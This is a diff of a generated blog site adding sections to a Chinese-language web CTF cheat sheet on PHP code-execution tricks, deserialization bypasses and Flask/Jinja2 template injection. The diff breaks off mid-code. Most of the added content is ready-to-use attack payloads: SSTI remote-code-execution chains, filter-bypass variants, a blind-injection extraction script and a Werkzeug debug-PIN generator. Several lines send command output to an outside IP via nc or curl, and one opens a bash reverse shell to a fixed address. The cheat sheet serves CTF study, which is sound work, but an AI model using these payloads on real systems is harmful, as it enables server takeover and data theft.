@@ -23,7 +23,7 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Wed, 18 Mar 2020 18:20:09 +0800</lastBuildDate>
+        <lastBuildDate>Wed, 18 Mar 2020 21:36:04 +0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss+xml" href="https://ajatars.github.io/rss.xml" />
         
@@ -372,7 +372,7 @@ print(bashexec)
 <li><a href="#1php%E7%9B%B8%E5%85%B3">1.PHP相关</a>
 <ul>
 <li><a href="#11-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96">1.1 变量覆盖</a></li>
-<li><a href="#12-%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D">1.2 变量命名</a></li>
+<li><a href="#12-%E5%8F%98%E9%87%8F%E7%9B%B8%E5%85%B3">1.2 变量相关</a></li>
 <li><a href="#13-php%E4%BC%AA%E5%8D%8F%E8%AE%AE">1.3 php伪协议</a></li>
 <li><a href="#14-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">1.4 php反序列化</a></li>
 <li><a href="#15-%E7%AA%81%E7%A0%B4disable_functions">1.5 突破disable_functions</a></li>
@@ -422,22 +422,24 @@ print(bashexec)
 <ul>
 <li><a href="#71-bash%E4%B8%8B%E7%9A%84%E4%B8%80%E4%BA%9Btrick">7.1 bash下的一些trick</a></li>
 <li><a href="#72-%E5%B7%A7%E7%94%A8curl">7.2 巧用curl</a></li>
-<li><a href="#73-php%E4%B8%8B%E7%9A%84system%E4%B8%8Eeval">7.3 php下的system与eval</a></li>
 </ul>
 </li>
 <li><a href="#8python%E7%9B%B8%E5%85%B3">8.python相关</a>
 <ul>
 <li><a href="#81-ssti">8.1 ssti</a></li>
 <li><a href="#82-pin%E7%A0%81">8.2 pin码</a></li>
+<li><a href="#83-flask-session">8.3 flask-session</a></li>
+<li><a href="#84-python-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">8.4 python-格式化字符串</a></li>
+<li><a href="#85-python-%E4%B8%80%E4%BA%9B%E5%85%B6%E4%BB%96trick">8.5 python-一些其他trick</a></li>
 </ul>
 </li>
-<li><a href="#9java%E7%9B%B8%E5%85%B3">9.java相关</a>
+<li><input disabled="" type="checkbox"><a href="#9java%E7%9B%B8%E5%85%B3">9.java相关</a>
 <ul>
 <li><a href="#91-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">9.1 java反序列化</a></li>
 <li><a href="#92-fastjson%E6%BC%8F%E6%B4%9E">9.2 fastjson漏洞</a></li>
 </ul>
 </li>
-<li><a href="#10javascript%E7%9B%B8%E5%85%B3">10.javascript相关</a>
+<li><input disabled="" type="checkbox"><a href="#10javascript%E7%9B%B8%E5%85%B3">10.javascript相关</a>
 <ul>
 <li><a href="#101-javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93">10.1 javascript原型链污染</a></li>
 <li><a href="#102-preventExtensions%E7%BB%95%E8%BF%87">10.2 preventExtensions绕过</a></li>
@@ -447,7 +449,7 @@ print(bashexec)
 <li><a href="#106-express%E6%A1%86%E6%9E%B6">10.6 express框架</a></li>
 </ul>
 </li>
-<li><a href="#11nodejs%E7%9B%B8%E5%85%B3">11.NodeJS相关</a>
+<li><input disabled="" type="checkbox"><a href="#11nodejs%E7%9B%B8%E5%85%B3">11.NodeJS相关</a>
 <ul>
 <li><a href="#111-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8express%E6%A1%86%E6%9E%B6">11.1 快速启动express框架</a></li>
 <li><a href="#112-npm%E6%89%80%E6%9C%89%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E6%BC%8F%E6%B4%9E">11.2 npm所有第三方库漏洞</a></li>
@@ -458,8 +460,8 @@ print(bashexec)
 <li><a href="#117-nodemon-node%E7%9A%84debug%E6%A8%A1%E5%BC%8F">11.7 nodemon-node的debug模式</a></li>
 </ul>
 </li>
-<li><a href="#12XSS">12.XSS</a></li>
-<li><a href="#12%E5%85%B6%E4%BB%96">13.其他</a>
+<li><input disabled="" type="checkbox"><a href="#12XSS">12.XSS</a></li>
+<li><input disabled="" type="checkbox"><a href="#12%E5%85%B6%E4%BB%96">13.其他</a>
 <ul>
 <li><a href="#121-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81">13.1 http请求走私</a></li>
 <li><a href="#122-jwt%E6%94%BB%E5%87%BB">13.2 jwt攻击</a></li>
@@ -474,7 +476,7 @@ print(bashexec)
 <p><strong>extract()</strong> 该函数使用数组键名作为变量名，通常结合全局变量: $_GET、$_POST、$_REQUEST。</p>
 <p><strong>parse_str()</strong> 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p>
 <hr>
-<h4 id="12-变量命名">1.2 变量命名</h4>
+<h4 id="12-变量相关">1.2 变量相关</h4>
 <p>php命名变量可使用大括号包裹</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -492,7 +494,28 @@ print(bashexec)
 <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
 </code></pre></td></tr></table>
 </div>
-</div><hr>
+</div><p>php复杂变量:</p>
+<p>任何具有 <a href="https://www.php.net/manual/zh/language.types.string.php">string</a> 表达的标量变量，数组单元或对象属性都可使用此语法。只需简单地像在 <a href="https://www.php.net/manual/zh/language.types.string.php">string</a> 以外的地方那样写出表达式，然后用花括号 <em>{</em> 和 <em>}</em> 把它括起来即可。由于 <em>{</em> 无法被转义，只有 <em>$</em> 紧挨着 <em>{</em> 时才会被识别。可以用 <em>{$</em> 来表达 <em>{$</em>。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php">利用:
+<span class="cp">&lt;?php</span>
+<span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">phpinfo()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>		  
+<span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">system(whoami)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>	  <span class="c1">//括号包含
+</span><span class="c1"></span><span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;${system (whoami)}&#34;</span><span class="p">;</span>    <span class="c1">// 空格
+</span><span class="c1"></span><span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="si">${</span><span class="nv">(sy.stem)(whoami)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>  <span class="c1">// . 拼接
+</span></code></pre></td></tr></table>
+</div>
+</div><p><a href="https://xz.aliyun.com/t/4785">从一道题讲PHP复杂变量</a></p>
+<hr>
 <h4 id="13-php伪协议">1.3 php伪协议</h4>
 <p>php//访问各个输入/输出流（I / O流），在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php:/ /input用于执行php代码。</p>
 <p><strong>php://filter</strong>: 常用于读取文件(文件函数可控参数，xxe)、死亡绕过exit(),die()、phar metadate反序列化,当有正则过滤时，可尝试大小写绕过。</p>
@@ -651,7 +674,9 @@ php://filter/resource=phar://tmp/uploads/xxxx.jpg
 </li>
 <li>
 <p>正则过滤类对象或者其它对象时:</p>
-<p>​	可以在对象长度前添加<code>+</code>进行绕过，如<code>o:32</code> 改成 <code>o:+32</code></p>
+<p>​	过滤：&lsquo;O:&rsquo;</p>
+<p>​	可以在对象长度前添加<code>+</code>进行绕过，如<code>O:32</code> 改成 <code>O:+32</code>;</p>
+<p>​	在数组里面添加类对象,<code>a:1{i:0;O:3:&quot;Obj&quot;:1{}}</code>.</p>
 </li>
 <li>
 <p>反序列化长度逃逸:</p>
@@ -710,10 +735,10 @@ assert(&quot;strpos('$file', '..') === false&quot;);
 <hr>
 <h4 id="18-php代码执行getshell">1.8 php代码执行getshell</h4>
 <p><a href="https://www.jianshu.com/p/9ae0c80751c4">CTF踩坑PHP编写一个不包含数字字母和下划线的后门</a></p>
-<p>异或getshell</p>
+<p>异或getshell:</p>
 <p>在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
 <p><a href="https://xz.aliyun.com/t/5677">一道题回顾php异或webshell</a></p>
-<p>取反getsehll</p>
+<p>取反getsehll:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
@@ -735,6 +760,14 @@ print(~&#34;和&#34;.encode(&#39;utf8&#39;)[2])
 </div><p>“和”的第三个字节的值为140[0x8c]，取反的值为-141。
 负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。</p>
 <p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
+<p>用http头传参绕过:</p>
+<p>nginx、apache可用get_defined_vars()，apche还可以用getallheaders()</p>
+<pre><code>eval(next(current(get_defined_vars())));&amp;b=var_dump(file_get_contents('/flag'));
+</code></pre><p>session操作</p>
+<pre><code>eval(hex2bin(session_id(session_start())));
+
+PHPSESSID=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b
+</code></pre><p><a href="https://blog.zeddyu.info/2019/02/28/Some-Tricks-of-Bypass-php-waf/">绕过一些phpwaf命令执行的方法</a></p>
 <hr>
 <h2 id="2关键文件">2.关键文件</h2>
 <h4 id="21-nginx">2.1 nginx</h4>
@@ -1082,6 +1115,406 @@ magic_quotes_gpc 关闭
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">curl vps -X POST -d <span class="sb">`</span>cat /flag<span class="sb">`</span>
 curl -T ./flag vps
+</code></pre></td></tr></table>
+</div>
+</div><hr>
+<h2 id="8-python相关">8. python相关</h2>
+<h4 id="81-ssti">8.1 ssti</h4>
+<p><em><strong>基础:</strong></em></p>
+<p>入门:<a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p>
+<p>漏洞成因在于：<strong><code>render_template_string</code>函数在渲染模板的时候使用了%s来动态的替换字符串，我们知道Flask 中使用了Jinja2 作为模板渲染引擎，<code>{{}}</code>在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把<code>{{}}</code>包裹的内容当做变量解析替换。比如<code>{{1+1}}</code>会被解析成2。</strong></p>
+<p>在CTF中ssti经常存在404中&hellip;</p>
+<p>常识:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="vm">__class__</span> <span class="o">//</span><span class="err">返回调用的参数类型。</span>
+<span class="n">__base__</span> <span class="o">//</span><span class="err">对象的一个基类，一般情况下是</span><span class="nb">object</span><span class="err">，有时不是，这时需要使用下一个方法</span>
+<span class="vm">__mro__</span> <span class="o">//</span><span class="err">同样可以获取对象的基类，只是这时会显示出整个继承链的关系，是一个列表，</span><span class="n">object在最底层故在列表中的最后</span><span class="err">，通过</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="err">可以获取到</span>
+<span class="n">__subclasses__</span><span class="p">()</span> <span class="o">//</span><span class="err">继承此对象的子类，返回一个列表</span>
+
+<span class="err">魔术函数</span>
+    <span class="n">__dict__类的静态函数</span><span class="err">、类函数、普通函数、全局变量以及一些内置的属性都是放在类的</span><span class="n">__dict__里的对象的__dict__中存储了一些self</span><span class="o">.</span><span class="n">xxx的一些东西内置的数据类型没有__dict__属性每个类有自己的__dict__属性</span><span class="err">，就算存在继承关系，父类的</span><span class="vm">__dict__</span> <span class="err">并不会影响子类的</span><span class="n">__dict__对象也有自己的__dict__属性</span><span class="err">，</span> <span class="err">存储</span><span class="bp">self</span><span class="o">.</span><span class="n">xxx</span> <span class="err">信息，父子类对象公用</span><span class="vm">__dict__</span>
+
+    <span class="n">__globals__该属性是函数特有的属性</span><span class="p">,</span><span class="err">记录当前文件全局变量的值</span><span class="p">,</span><span class="err">如果某个文件调用了</span><span class="n">os</span><span class="err">、</span><span class="n">sys等库</span><span class="p">,</span><span class="err">但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用</span><span class="n">globals属性访问全局的变量</span><span class="err">。该属性保存的是函数全局变量的字典引用。</span>
+
+    <span class="fm">__getattribute__</span><span class="p">()</span><span class="err">实例、类、函数都具有的</span><span class="n">__getattribute__魔术方法</span><span class="err">。事实上，在实例化的对象进行</span><span class="o">.</span><span class="err">操作的时候（形如：</span><span class="n">a</span><span class="o">.</span><span class="n">xxx</span><span class="o">/</span><span class="n">a</span><span class="o">.</span><span class="n">xxx</span><span class="p">()</span><span class="err">），都会自动去调用</span><span class="n">__getattribute__方法</span><span class="err">。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>从变量-&gt;对象-&gt;基类-&gt;子类遍历-&gt;全局变量</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__mro__</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()):</span> <span class="k">print</span> <span class="n">i</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><em><strong>多行python语句</strong></em></p>
+<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.__globals__.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__(&quot;os&quot;).popen(&quot;id&quot;).read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+</code></pre><p><a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
+<p><em><strong>寻找RCE的类</strong></em></p>
+<p>python2</p>
+<pre><code>#python2
+num = 0
+for item in ''.__class__.__mro__[-1].__subclasses__():
+    try:
+        if 'os' in item.__init__.__globals__:
+            print num,item
+        num+=1
+    except:
+        num+=1
+</code></pre><p>python3</p>
+<pre><code>#!/usr/bin/python3
+# coding=utf-8
+# python 3.5
+from flask import Flask
+from jinja2 import Template
+# Some of special names
+searchList = ['__init__', &quot;__new__&quot;, '__del__', '__repr__', '__str__', '__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__', '__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__', '__call__', &quot;__instancecheck__&quot;, '__subclasscheck__', '__len__', '__length_hint__', '__missing__','__getitem__', '__setitem__', '__iter__','__delitem__', '__reversed__', '__contains__', '__add__', '__sub__','__mul__']
+neededFunction = ['eval', 'open', 'exec','os']
+pay = int(input(&quot;Payload?[1|0]&quot;))
+for index, i in enumerate({}.__class__.__base__.__subclasses__()):
+    for attr in searchList:
+        if hasattr(i, attr):
+            if eval('str(i.'+attr+')[1:9]') == 'function':
+                for goal in neededFunction:
+                    if (eval('&quot;'+goal+'&quot; in i.'+attr+'.__globals__[&quot;__builtins__&quot;].keys()')):
+                        if pay != 1:
+                            print(i.__name__,&quot;:&quot;, attr, goal)
+                        else:
+                            print(&quot;{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='&quot; + i.__name__ + &quot;' %}{{ c.&quot; + attr + &quot;.__globals__['__builtins__'].&quot; + goal + &quot;(\&quot;[evil]\&quot;) }}{% endif %}{% endfor %}&quot;)
+</code></pre><p><em><strong>无回显</strong></em></p>
+<pre><code>''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('ls | nc xx.xxx.xx.xx 44444')
+</code></pre><p>盲注</p>
+<pre><code>import requests
+
+url = 'http://127.0.0.1:8080/'
+
+def check(payload):
+    postdata = {
+        'exploit':payload
+        }
+    r = requests.post(url, data=postdata).content
+    return '~p0~' in r
+
+password  = ''
+s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$'()*+,-./:;&lt;=&gt;?@[\]^`{|}~'&quot;_%'
+
+for i in xrange(0,100):
+    for c in s:
+        payload = '{% if &quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&quot;/tmp/test&quot;).read()['+str(i)+':'+str(i+1)+'] == &quot;'+c+'&quot; %}~p0~{% endif %}'
+        if check(payload):
+            password += c
+            break
+    print password
+</code></pre><p><em><strong>Bypass</strong></em></p>
+<p>拼接:</p>
+<pre><code>object.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')
+
+().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()
+</code></pre><p>编码:</p>
+<pre><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode('base64'))
+</code></pre><p>过滤中括号[]:</p>
+<pre><code>getitem()
+&quot;&quot;.__class__.__mro__[2]
+&quot;&quot;.__class__.__mro__.__getitem__(2)
+pop()
+''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()
+</code></pre><p>过滤引号:</p>
+<pre><code>先获取chr函数，赋值给chr，后面拼接字符串
+{% set
+chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr
+%}{{
+().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()
+}}
+
+借助request对象:
+{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd
+将其中的request.args改为request.values则利用post的方式进行传参
+</code></pre><p>过滤下划线_:</p>
+<pre><code>{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read()
+}}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
+</code></pre><p>过滤{{:</p>
+<pre><code>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://xx.xxx.xx.xx:8080/?i=`whoami`').read()=='p' %}1{% endif %}
+</code></pre><p>内建函数删除:</p>
+<pre><code>del __builtins__.__dict__['__import__']
+del __builtins__.__dict__['eval']
+del __builtins__.__dict__['execfile']
+
+reload(__builtins__)
+</code></pre><p>过滤[:</p>
+<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
+</code></pre><p>过滤class:</p>
+<pre><code> request['__cl'+'ass__'].__mro__[12]}}
+ 
+ {{session['cla'+'ss'].bases[0].bases[0].bases[0].bases[0].subclasses()[118]}}
+</code></pre><p>其他:</p>
+<pre><code>不利用__globals__
+[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system('ls')
+
+timeit
+import timeit
+timeit.timeit(&quot;__import__('os').system('dir')&quot;,number=1)
+
+platfor
+import platform
+print platform.popen('dir').read()
+</code></pre><p>一些poc:</p>
+<pre><code>python2:
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).system(&quot;ls&quot;)')
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()
+&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system(&quot;ls&quot;)')
+().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('bash -c &quot;bash -i &gt;&amp; /dev/tcp/172.6.6.6/9999 0&gt;&amp;1&quot;')
+
+python3：
+{{{}.__class__.__mro__[1].__subclasses__()[103].__init__.__globals__['open']('this_is_the_fl'+'ag.txt').read()}}
+{{[].__class__.__mro__[1].__subclasses__()[174].__init__.__globals__['__builtins__']['ev'+'al'](__import__('os').popen('dir').read())}}
+{{{}.__class__.__base__.__subclasses__()[103].__init__.__globals__['__builtins__']['ev'+'al'](&quot;__imp&quot;+&quot;ort_&quot;+&quot;_('o&quot;+&quot;s').po&quot;+&quot;pen('dir').read()&quot;)}}
+
+open('flag').__getattribute__('read')()
+
+{{{}[request[&quot;form&quot;][&quot;param&quot;]][request[&quot;form&quot;][&quot;base&quot;]][request[&quot;form&quot;][&quot;subclasses&quot;]]()[103][request[&quot;form&quot;][&quot;init&quot;]][request[&quot;form&quot;][&quot;globals&quot;]][request[&quot;form&quot;][&quot;builtins&quot;]]['eval'](request[&quot;form&quot;][&quot;args&quot;])}}
+POST： param=__class__&amp;base=__base__&amp;subclasses=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;builtins=__builtins__&amp;args=__import__('os').popen('dir').read()
+
+</code></pre><p><a href="https://www.anquanke.com/post/id/188172#h3-10">SSTI/沙盒逃逸详细总结</a></p>
+<p><a href="https://p0sec.net/index.php/archives/120/">Flask/Jinja2模板注入中的一些绕过姿势</a></p>
+<h4 id="82-pin码">8.2 pin码</h4>
+<p>Flask debug模式下，存在读取配置文件。</p>
+<p><a href="https://www.anquanke.com/post/id/197602?display=mobile">从一道ctf题谈谈flask开启debug模式存在的安全问题</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;flaskweb&#39;</span><span class="c1"># username,etc/passwd</span>
+    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
+    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+    <span class="s1">&#39;/usr/local/lib/python3.7/site-packages/flask/app.py&#39;</span> <span class="c1"># getattr(mod, &#39;__file__&#39;, None),debug</span>
+<span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="s1">&#39;2485377957891&#39;</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+    <span class="s1">&#39;e96996169e90130c1b6e2b3fb9af5b39abcacc1b1f84211a58e27854c3a1219e&#39;</span><span class="c1"># get_machine_id(),/proc/self/cgroup, /etc/machine-id</span>
+<span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+        <span class="k">continue</span>
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
+
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span><span class="bp">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><hr>
+<h4 id="83-flask-session">8.3 flask-session</h4>
+<p>seesion通过序列化对键以及键值进行进行序列化，通过hmacsha1进行签名，最终生成一串字符串</p>
+<p>流程为：json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</p>
+<p>解密session可能会获得有用信息。</p>
+<p>伪造session需要SECRET_KEY，SECRET_KEY常通过文件读取或者爆破获取。</p>
+<p>解密py</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
